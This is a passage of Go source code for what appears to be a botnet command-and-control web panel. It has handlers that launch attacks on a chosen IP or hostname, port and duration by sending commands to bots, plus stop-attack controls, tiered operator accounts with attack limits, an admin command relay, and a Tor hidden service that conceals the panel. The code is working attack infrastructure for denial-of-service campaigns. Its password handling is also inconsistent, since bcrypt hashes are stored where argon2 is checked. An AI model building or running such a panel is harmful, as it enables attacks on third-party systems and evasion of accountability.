		botsJSON, err := json.Marshal(data.Bots)
		if err != nil {
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
		data.BotsJSON = template.JS(botsJSON)

		err = tmpl.ExecuteTemplate(w, "dashboard.html", data)
		if err != nil {
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
	})))

	http.Handle("/attack", csrfMiddleware(addSecurityHeaders(requireAuth(handleAttackForm))))
	http.Handle("/admin-command", csrfMiddleware(addSecurityHeaders(requireAuth(handleAdminCommand))))

	http.Handle("/stop-all-attacks", csrfMiddleware(addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		if len(ongoingAttacks) == 0 {
			http.Error(w, "No active attacks to stop", http.StatusBadRequest)
			return
		}

		for id := range ongoingAttacks {
			delete(ongoingAttacks, id)
		}

		sendToBots("STOP ALL")
		w.Write([]byte("All attacks stopped"))
	}))))

	http.Handle("/stop-attack", csrfMiddleware(addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		attackID := r.URL.Query().Get("id")
		if attackID == "" {
			http.Redirect(w, r, "/dashboard?flash=Invalid+attack+ID", http.StatusSeeOther)
			return
		}

		attack, exists := ongoingAttacks[attackID]
		if !exists {
			http.Redirect(w, r, "/dashboard?flash=Attack+not+found", http.StatusSeeOther)
			return
		}

		sendToBots(fmt.Sprintf("STOP %s", attack.Target))
		delete(ongoingAttacks, attackID)
		http.Redirect(w, r, "/dashboard?flash=Attack+stopped", http.StatusSeeOther)
	}))))

	http.Handle("/add-user", csrfMiddleware(addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if user.Level != "Owner" {
			http.Error(w, "Permission denied - Owner access required", http.StatusForbidden)
			return
		}

		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		username := strings.TrimSpace(r.FormValue("username"))
		password := r.FormValue("password")
		level := r.FormValue("level")

		if username == "" || password == "" || level == "" {
			http.Error(w, "Missing user information", http.StatusBadRequest)
			return
		}

		if !inputValidator.ValidateUsername(username) {
			http.Error(w, "Invalid username format", http.StatusBadRequest)
			return
		}

		if err := validatePassword(password); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), 14)
		if err != nil {
			http.Error(w, "Error hashing password", http.StatusInternalServerError)
			return
		}

		users := getUsers()
		for _, u := range users {
			if u.Username == username {
				http.Error(w, "Username already exists", http.StatusBadRequest)
				return
			}
		}

		users = append(users, User{
			ID:       uuid.New().String(),
			Username: username,
			Password: string(hashedPassword),
			Expire:   time.Now().AddDate(1, 0, 0),
			Level:    level,
		})

		if err := saveUsers(users); err != nil {
			http.Error(w, "Error saving user", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"message": "User added successfully",
		})
	}))))

	http.Handle("/delete-user", csrfMiddleware(addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if user.Level != "Owner" {
			http.Error(w, "Permission denied - Owner access required", http.StatusForbidden)
			return
		}

		username := r.URL.Query().Get("username")
		if username == "" {
			http.Redirect(w, r, "/dashboard?flash=Invalid+username", http.StatusSeeOther)
			return
		}

		if err := deleteUser(username); err != nil {
			http.Redirect(w, r, "/dashboard?flash=Error+deleting+user: "+url.QueryEscape(err.Error()), http.StatusSeeOther)
			return
		}

		http.Redirect(w, r, "/dashboard?flash=User+deleted+successfully", http.StatusSeeOther)
	}))))

	http.HandleFunc("/logout", addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		session, _ := store.Get(r, "scream_session")
		session.Options.MaxAge = -1
		delete(session.Values, "csrf_token")
		session.Save(r, w)

		http.SetCookie(w, &http.Cookie{
			Name:     "access_token",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteLaxMode,
		})

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}))

	fileServer := http.StripPrefix("/static/", http.FileServer(http.Dir("static")))
	staticHandler := addSecurityHeaders(fileServer.ServeHTTP)
	http.Handle("/static/", staticHandler)
	setupTorHiddenService()

	log.Fatal(server.ListenAndServeTLS(CERT_FILE, KEY_FILE))
}

func handleSSE(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method == "POST" {
		session, err := GetSession(r)
		if err != nil {
			http.Error(w, "CSRF validation failed", http.StatusForbidden)
			return
		}

		csrfToken := r.Header.Get("X-CSRF-Token")
		if csrfToken == "" {
			csrfToken = r.FormValue("csrf_token")
		}

		if csrfToken == "" || csrfToken != session.Values["csrf_token"] {
			http.Error(w, "CSRF validation failed", http.StatusForbidden)
			return
		}
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("X-Accel-Buffering", "no")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	clientChan := make(chan Metrics, 10)

	sseClientsMu.Lock()
	sseClients[clientChan] = true
	sseClientsMu.Unlock()

	fmt.Fprintf(w, "event: connected\ndata: {\"status\": \"connected\"}\n\n")
	flusher.Flush()

	defer func() {
		sseClientsMu.Lock()
		delete(sseClients, clientChan)
		sseClientsMu.Unlock()
		close(clientChan)
	}()

	initialData := Metrics{
		BotCount:             getBotCount(),
		ActiveAttacks:        len(ongoingAttacks),
		Attacks:              getOngoingAttacks(),
		Bots:                 getBots(),
		User:                 &user,
		MaxConcurrentAttacks: GetMaxConcurrentAttacks(user.Level),
	}

	if err := sendSSEData(w, flusher, initialData); err != nil {
		log.Println("Error sending initial SSE data:", err)
		return
	}

	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	connectionMonitor := time.NewTicker(5 * time.Second)
	defer connectionMonitor.Stop()

	for {
		select {
		case <-ticker.C:
			if _, err := fmt.Fprintf(w, ": heartbeat\n\n"); err != nil {
				return
			}
			flusher.Flush()

		case <-connectionMonitor.C:
			if _, err := fmt.Fprintf(w, ": ping\n\n"); err != nil {
				return
			}
			flusher.Flush()

		case metrics, ok := <-clientChan:
			if !ok {
				return
			}
			if err := sendSSEData(w, flusher, metrics); err != nil {
				log.Println("Error sending SSE data:", err)
				return
			}

		case <-r.Context().Done():
			return
		}
	}
}

func sendSSEData(w http.ResponseWriter, flusher http.Flusher, data Metrics) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("error marshaling SSE data: %w", err)
	}

	if _, err := fmt.Fprintf(w, "data: %s\n\n", jsonData); err != nil {
		return fmt.Errorf("error writing SSE data: %w", err)
	}

	flusher.Flush()
	return nil
}

func handleUserData(w http.ResponseWriter, r *http.Request, user User) {
	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"user":    user,
		"bots":    getBots(),
		"attacks": getOngoingAttacks(),
	})
}

func setupTorHiddenService() {
	torDataDir := "/var/lib/tor/hidden_service/"
	if err := os.MkdirAll(torDataDir, 0700); err != nil {
		log.Fatalf("Failed to create tor data directory: %v", err)
	}

	torrcContent := fmt.Sprintf(`
HiddenServiceDir %s
HiddenServicePort 80 127.0.0.1:%s
`, torDataDir, WEB_SERVER_PORT)

	if err := os.WriteFile("torrc", []byte(torrcContent), 0600); err != nil {
		log.Fatalf("Failed to write torrc file: %v", err)
	}

	cmd := exec.Command("tor", "-f", "torrc")
	if err := cmd.Start(); err != nil {
		log.Fatalf("Failed to start tor: %v", err)
	}

	// Wait for tor to start and get the onion address
	time.Sleep(5 * time.Second)
	hostname, err := os.ReadFile(filepath.Join(torDataDir, "hostname"))
	if err != nil {
		log.Fatalf("Failed to read tor hostname: %v", err)
	}

	log.Printf("Tor hidden service available at: %s", string(hostname))
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		session, err := store.Get(r, "scream_session")
		if err == nil {
			if auth, ok := session.Values["authenticated"].(bool); ok && auth {
				username, _ := session.Values["username"].(string)
				userID, _ := session.Values["user_id"].(string)

				users := getUsers()
				for _, u := range users {
					if u.ID == userID && u.Username == username {
						handler(w, r, u)
						return
					}
				}
			}
		}

		if cookie, err := r.Cookie("access_token"); err == nil {
			claims, err := validateJWT(cookie.Value)
			if err == nil {
				users := getUsers()
				for _, u := range users {
					if u.Username == claims.Username {
						session, _ := store.New(r, "scream_session")
						session.Values["authenticated"] = true
						session.Values["username"] = u.Username
						session.Values["level"] = u.Level
						session.Values["user_id"] = u.ID
						session.Save(r, w)

						handler(w, r, u)
						return
					}
				}
			}
		}

		http.Redirect(w, r, "/?flash=Please+login+first", http.StatusSeeOther)
	}
}

func handleAttackForm(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	// Add CSRF validation at the start
	session, err := GetSession(r)
	if err != nil {
		http.Redirect(w, r, "/dashboard?flash=Session+error", http.StatusSeeOther)
		return
	}

	csrfToken := r.FormValue("csrf_token")
	sessionToken, ok := session.Values["csrf_token"].(string)
	if !ok || !secureCompare(csrfToken, sessionToken) {
		http.Redirect(w, r, "/dashboard?flash=CSRF+validation+failed", http.StatusSeeOther)
		return
	}

	if err := r.ParseForm(); err != nil {
		http.Redirect(w, r, "/dashboard?flash=Invalid+form+data", http.StatusSeeOther)
		return
	}

	method := r.FormValue("method")
	ip := r.FormValue("ip")
	port := r.FormValue("port")
	duration := r.FormValue("duration")

	if !commandValidator.IsCommandAllowed(user.Level, method) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+attack+method", http.StatusSeeOther)
		return
	}

	if !inputValidator.ValidateIP(ip) && !inputValidator.ValidateHostname(ip) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+target+IP/hostname", http.StatusSeeOther)
		return
	}

	portInt, err := strconv.Atoi(port)
	if err != nil || !inputValidator.ValidatePort(portInt) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+port+number", http.StatusSeeOther)
		return
	}

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 || dur > GetMaxAttackDuration(user.Level) {
		http.Redirect(w, r, fmt.Sprintf("/dashboard?flash=Invalid+duration+(1-%d+seconds)", GetMaxAttackDuration(user.Level)), http.StatusSeeOther)
		return
	}

	if len(ongoingAttacks) >= GetMaxConcurrentAttacks(user.Level) {
		http.Redirect(w, r, "/dashboard?flash=Maximum+attack+limit+reached", http.StatusSeeOther)
		return
	}

	attackID := generateCryptoRandomString(8)
	attack := Attack{
		Method:    method,
		Target:    ip,
		Port:      port,
		Duration:  time.Duration(dur) * time.Second,
		Start:     time.Now(),
		UserLevel: user.Level,
	}

	ongoingAttacks[attackID] = attack

	command := fmt.Sprintf("%s %s %d %d",
		sanitizeMethod(method),
		sanitizeTarget(ip),
		portInt,
		dur)
	if err := sendToBots(command); err != nil {
		delete(ongoingAttacks, attackID)
		http.Redirect(w, r, "/dashboard?flash=Error+sending+attack+"+url.QueryEscape(err.Error()), http.StatusSeeOther)
		return
	}

	updateAttackStats(method, time.Duration(dur)*time.Second)

	go func(id string, dur time.Duration) {
		time.Sleep(dur)
		delete(ongoingAttacks, id)
	}(attackID, time.Duration(dur)*time.Second)

	http.Redirect(w, r, "/dashboard?flash=Attack+launched+successfully", http.StatusSeeOther)
}

func sanitizeMethod(method string) string {
	// Only allow whitelisted methods
	if !commandValidator.IsCommandAllowed("Owner", method) {
		return ""
	}
	return method
}

func sanitizeTarget(target string) string {
	// Validate either IP or hostname
	if !inputValidator.ValidateIP(target) && !inputValidator.ValidateHostname(target) {
		return ""
	}
	return target
}

func handleAdminCommand(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}

	command := r.FormValue("command")
	if command == "" {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if !commandValidator.IsCommandAllowed(user.Level, command) {
		http.Error(w, "Operation not permitted", http.StatusForbidden)
		return
	}

	if err := sendToBots(command); err != nil {
		http.Error(w, "Operation failed", http.StatusBadRequest)
		return
	}

	http.Redirect(w, r, "/dashboard?flash=Command+sent+successfully", http.StatusSeeOther)
}

func generateAccessToken(user User) (string, error) {
	claims := &Claims{
		Username: user.Username,
		Level:    user.Level,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(JWT_ACCESS_EXPIRATION)),
			Issuer:    JWT_ISSUER,
			Audience:  jwt.ClaimStrings{JWT_AUDIENCE},
			ID:        uuid.New().String(),
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS512, claims)
	return token.SignedString([]byte(JWT_SECRET_KEY))
}

func authUser(username, password string) (bool, User) {
	users := getUsers()
	for _, user := range users {
		if user.Username == username {
			// Decode the stored hash
			decodedHash, err := base64.StdEncoding.DecodeString(user.Password)
			if err != nil || len(decodedHash) < 16 {
				return false, User{}
			}

			// Extract salt (first 16 bytes) and hash
			salt := decodedHash[:16]
			storedHash := decodedHash[16:]

			// Compute the hash of the provided password
			computedHash := argon2.IDKey([]byte(password), salt, ARGON2_TIME, ARGON2_MEMORY, ARGON2_THREADS, ARGON2_KEY_LEN)

			// Compare the hashes
			if subtle.ConstantTimeCompare(computedHash, storedHash) == 1 {
				if time.Now().After(user.Expire) {
					return false, User{}
				}
				return true, user
			}
		}
	}
	return false, User{}
}

func getUsers() []User {
	data, err := os.ReadFile(USERS_FILE)
	if err != nil {
		return []User{}
	}
	var users []User
	if err := json.Unmarshal(data, &users); err != nil {
		return []User{}
	}
	return users
}

func deleteUser(username string) error {
	users := getUsers()
	var updatedUsers []User

	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		}
	}

	if len(updatedUsers) == len(users) {
		return fmt.Errorf("user not found")
	}

	return saveUsers(updatedUsers)
}

func saveUsers(users []User) error {
	// Ensure passwords are properly hashed for new users
	for i, user := range users {
		// Check if password is already hashed (contains base64 encoded salt+hash)
		if _, err := base64.StdEncoding.DecodeString(user.Password); err != nil {
			// Password is not hashed, hash it
			salt := make([]byte, 16)
			if _, err := rand.Read(salt); err != nil {
				return fmt.Errorf("error generating salt: %v", err)
			}

			hashedPassword := argon2.IDKey([]byte(user.Password), salt, ARGON2_TIME, ARGON2_MEMORY, ARGON2_THREADS, ARGON2_KEY_LEN)
			users[i].Password = base64.StdEncoding.EncodeToString(append(salt, hashedPassword...))
		}
	}

	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(USERS_FILE, data, 0600)
}

func getOngoingAttacks() []AttackInfo {
	var attacks []AttackInfo

	for id, attack := range ongoingAttacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining <= 0 {
			delete(ongoingAttacks, id)
			continue
		}

		attacks = append(attacks, AttackInfo{
			Method:    attack.Method,
			Target:    attack.Target,
			Port:      attack.Port,
			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
			Remaining: formatDuration(remaining),
			ID:        id,
		})
	}

	return attacks
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60

	if hours > 0 {
		return fmt.Sprintf("%dh%dm%ds", hours, minutes, seconds)
	}
	if minutes > 0 {
		return fmt.Sprintf("%dm%ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func getBots() []Bot {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return bots
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return len(bots)
}

func getActiveBotsCount(bots []Bot) int {
	return len(bots)
}
